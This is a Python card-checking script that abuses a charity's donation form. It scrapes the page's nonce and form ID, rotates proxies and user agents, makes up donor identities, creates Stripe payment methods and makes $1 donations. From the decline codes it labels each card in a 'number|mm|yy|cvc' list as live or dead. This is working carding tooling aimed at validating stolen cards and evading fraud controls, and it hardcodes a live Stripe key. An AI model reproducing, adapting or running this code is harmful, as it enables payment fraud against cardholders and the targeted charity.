import requests
import random
import string
from bs4 import BeautifulSoup
import re
import json
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from proxy_manager import get_proxy_dict

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def create_robust_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def generate_random_name():
    first_names = ['James', 'Michael', 'Robert', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Daniel']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_random_email():
    name = generate_random_name().replace(" ", "").lower()
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{name}{random.randint(100,9999)}@{random.choice(domains)}"

def generate_guid():
    return f"{random.randbytes(4).hex()}-{random.randbytes(2).hex()}-{random.randbytes(2).hex()}-{random.randbytes(2).hex()}-{random.randbytes(6).hex()}"

def get_fresh_session_data(max_retries=3):
    proxies = get_proxy_dict()
    
    for attempt in range(max_retries):
        session = create_robust_session()
        user_agent = get_random_ua()
        
        session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
        try:
            response = session.get('https://ccfoundationorg.com/donate/', timeout=30, proxies=proxies)
            
            if response.status_code != 200:
                if attempt < max_retries - 1:
                    time.sleep(2 * (attempt + 1))
                    continue
                return None
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
            nonce = nonce_input.get('value') if nonce_input else None
            
            if not nonce:
                nonce_match = re.search(r'_charitable_donation_nonce["\s:=\']+([a-f0-9]{10})', response.text)
                nonce = nonce_match.group(1) if nonce_match else None
            
            form_id_input = soup.find('input', {'name': 'charitable_form_id'})
            form_id = form_id_input.get('value') if form_id_input else None
            
            if not form_id:
                form_id_match = re.search(r'charitable_form_id["\s:=\']+([a-f0-9\-]+)', response.text)
                form_id = form_id_match.group(1) if form_id_match else None
            
            pk_match = re.search(r'pk_live_[A-Za-z0-9]+', response.text)
            stripe_key = pk_match.group(0) if pk_match else 'pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
            
            if nonce and form_id:
                return {
                    'session': session,
                    'nonce': nonce,
                    'form_id': form_id,
                    'stripe_key': stripe_key,
                    'cookies': dict(session.cookies),
                    'proxies': proxies,
                    'user_agent': user_agent
                }
            
            if attempt < max_retries - 1:
                time.sleep(2 * (attempt + 1))
                
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                time.sleep(3 * (attempt + 1))
            continue
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                time.sleep(3 * (attempt + 1))
            continue
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2 * (attempt + 1))
            continue
    
    return None

def check_card(card_data: str, session_data: dict = None) -> dict:
    try:
        parts = card_data.strip().split('|')
        if len(parts) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format',
                'approved': False
            }
        
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()[-2:]
        cvc = parts[3].strip()
        
        fresh = session_data if session_data else get_fresh_session_data()
        if not fresh or not fresh.get('nonce') or not fresh.get('form_id'):
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get fresh session',
                'approved': False
            }
        
        session = create_robust_session()
        session.headers.update({
            'User-Agent': fresh.get('user_agent', get_random_ua()),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        if fresh.get('cookies'):
            session.cookies.update(fresh['cookies'])
        nonce = fresh['nonce']
        form_id = fresh['form_id']
        stripe_key = fresh['stripe_key']
        proxies = fresh.get('proxies')
        
        name = generate_random_name()
        email = generate_random_email()
        guid = generate_guid()
        muid = generate_guid()
        sid = generate_guid()
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][line1]=123+Main+St&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page={random.randint(50000, 100000)}&key={stripe_key}'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20, proxies=proxies)
        response_json = response.json()
        
        if 'error' in response_json:
            err = response_json['error']
            error_msg = err.get('message', 'Unknown error')
            error_code = err.get('code', '')
            decline_code = err.get('decline_code', '')
            
            if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                return {'card': card_data, 'status': 'APPROVED', 'message': 'Insufficient Funds (CVV Match)', 'approved': True}
            elif 'incorrect_cvc' in error_msg.lower() or error_code == 'incorrect_cvc':
                return {'card': card_data, 'status': 'APPROVED', 'message': 'Incorrect CVC (Live Card)', 'approved': True}
            elif 'incorrect_number' in error_code or 'invalid' in error_code:
                return {'card': card_data, 'status': 'DECLINED', 'message': 'Invalid Card Number', 'approved': False}
            elif 'expired' in error_code:
                return {'card': card_data, 'status': 'DECLINED', 'message': 'Expired Card', 'approved': False}
            
            return {'card': card_data, 'status': 'DECLINED', 'message': error_msg[:100], 'approved': False}
        
        pm_id = response_json.get('id')
        if not pm_id:
            return {'card': card_data, 'status': 'DECLINED', 'message': 'Failed to create payment method', 'approved': False}
        
        headers2 = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        first_name = name.split()[0]
        last_name = name.split()[1] if ' ' in name else 'Smith'
        
        data2 = {
            'charitable_form_id': form_id,
            form_id: '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'description': 'CC Foundation Donation Form',
            'ID': '1056420',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': '',
            'title': 'Mr',
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'address': '123 Main St',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response2 = session.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, timeout=25, proxies=proxies)
        
        try:
            result = response2.json()
        except:
            result = {'raw': response2.text[:300]}
        
        msg = str(result)
        
        if isinstance(result, dict):
            if result.get('success') == True:
                return {'card': card_data, 'status': 'APPROVED', 'message': 'Charged $1', 'approved': True}
            
            if 'errors' in result:
                errors = result.get('errors', {})
                if isinstance(errors, dict):
                    for key, val in errors.items():
                        if isinstance(val, list) and val:
                            error_text = val[0].lower()
                            if 'insufficient_funds' in error_text or 'insufficient funds' in error_text:
                                return {'card': card_data, 'status': 'APPROVED', 'message': 'Insufficient Funds (CVV Match)', 'approved': True}
                            elif 'incorrect_cvc' in error_text or 'security code' in error_text:
                                return {'card': card_data, 'status': 'APPROVED', 'message': 'Incorrect CVC (Live Card)', 'approved': True}
                            elif 'card_declined' in error_text or 'generic_decline' in error_text or 'declined' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Card Declined', 'approved': False}
                            elif 'do_not_honor' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Do Not Honor', 'approved': False}
                            elif 'stolen' in error_text or 'lost' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Lost/Stolen Card', 'approved': False}
                            elif 'expired' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Expired Card', 'approved': False}
                            elif 'requires_action' in error_text or '3d' in error_text:
                                return {'card': card_data, 'status': 'APPROVED', 'message': '3D Secure Required', 'approved': True}
                            else:
                                return {'card': card_data, 'status': 'DECLINED', 'message': val[0][:80], 'approved': False}
        
        msg_lower = msg.lower()
        if 'requires_action' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': '3D Secure Required', 'approved': True}
        elif 'insufficient_funds' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': 'Insufficient Funds (CVV Match)', 'approved': True}
        elif 'incorrect_cvc' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': 'Incorrect CVC (Live Card)', 'approved': True}
        elif 'success' in msg_lower and 'true' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': 'Charged $1', 'approved': True}
        else:
            return {'card': card_data, 'status': 'DECLINED', 'message': msg[:100] if len(msg) > 100 else msg, 'approved': False}

    except Exception as e:
        return {'card': card_data, 'status': 'ERROR', 'message': str(e)[:80], 'approved': False}
